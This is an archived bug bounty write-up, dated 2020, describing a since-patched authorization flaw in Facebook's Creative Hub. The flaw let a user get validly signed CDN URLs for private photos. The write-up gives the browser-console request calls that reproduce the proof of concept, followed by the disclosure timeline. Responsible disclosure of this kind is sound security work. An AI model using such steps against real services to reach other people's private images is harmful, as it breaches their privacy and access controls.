---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-03-13_generate-valid-signatures-for-fbcdn-urls.md
original_filename: 2020-03-13_generate-valid-signatures-for-fbcdn-urls.md
title: Generate valid signatures for FBCDN urls
category: documents
detected_topics:
- access-control
- command-injection
- otp
- business-logic
- api-security
- supply-chain
tags:
- imported
- documents
- access-control
- command-injection
- otp
- business-logic
- api-security
- supply-chain
language: en
raw_sha256: e601d8ec61f413cf43d5920b937daeb78f300fc543f7da2f0d713e4538ca1774
text_sha256: 59e8d4fa59c3617d5c1d939b4ca3e7f5392d2d764f8d054da460a3f254f79232
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Generate valid signatures for FBCDN urls

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-03-13_generate-valid-signatures-for-fbcdn-urls.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, business-logic, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `e601d8ec61f413cf43d5920b937daeb78f300fc543f7da2f0d713e4538ca1774`
- Text SHA256: `59e8d4fa59c3617d5c1d939b4ca3e7f5392d2d764f8d054da460a3f254f79232`


## Content

---
title: "Generate valid signatures for FBCDN urls"
page_title: "Generate valid signatures for FBCDN urls - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/generate-valid-signatures-for-fbcdn-urls/"
final_url: "https://philippeharewood.com/generate-valid-signatures-for-fbcdn-urls/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Logic flaw", "Broken authorization"]
publication_date: "2020-03-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4715
---

Posted on [March 13, 2020](https://philippeharewood.com/generate-valid-signatures-for-fbcdn-urls/)

# Generate valid signatures for FBCDN urls

A business endpoint exists in Creative Hub that allows one to upload a project icon via the ad account library connected to the project. This endpoint creates valid signatures for URLS that were previously not valid. This is based directly on work done by [Samm0uda](https://ysamm.com/?p=404).  
  
1\. Get a private photo and remove all additional query parameters  
  
`https://scontent.fpos3-1.fna.fbcdn.net/v/t1.0-9/87284588_124830725745195_9124219877853233152_n.png?_nc_cat=1&_nc_sid=85a577&_nc_ohc=qpVkR_UAuMcAX_4excB&_nc_ht=scontent.fpos3-1.fna&oh=8716dde6708dcb1b24625737818164d0&oe=5EC97A80`  
  
to  
  
`https://scontent.fpos3-1.fna.fbcdn.net/v/t1.0-9/87284588_124830725745195_9124219877853233152_n.png`

2\. Given an AdaccountA from BusinessA linked to the current user UserA execute the following in a browser console.  
  
`new AsyncRequest('https://business.facebook.com/ads/creativehub/project/edit/?ad_account_id=AdaccountA&name=WhiteHatText&profile_picture_url=https://scontent.fpos3-1.fna.fbcdn.net/v/t1.0-9/87284588_124830725745195_9124219877853233152_n.png').send()`  
  
3\. Get the current projects

`new AsyncRequest('https://business.facebook.com/ads/creative-studio/projects/?business_id=BusinessA').send()`

4\. One of the items in the response will have the new generated URL  
  
5\. The new URL will point to a 64×64 cropped version of the private photo  
  
**Timeline**  
  
Mar 13, 2020 – Report sent  
Mar 13, 2020 – Confirmation of submission by Facebook  
Mar 16, 2020 – Confirmation of patch by Facebook  
Apr 16, 2020 – Bounty awarded by Facebook  
  
Thanks again to [Samm0uda](https://ysamm.com/?p=404) and the rest of the Yes™ who have provided in depth knowledge and motivation.
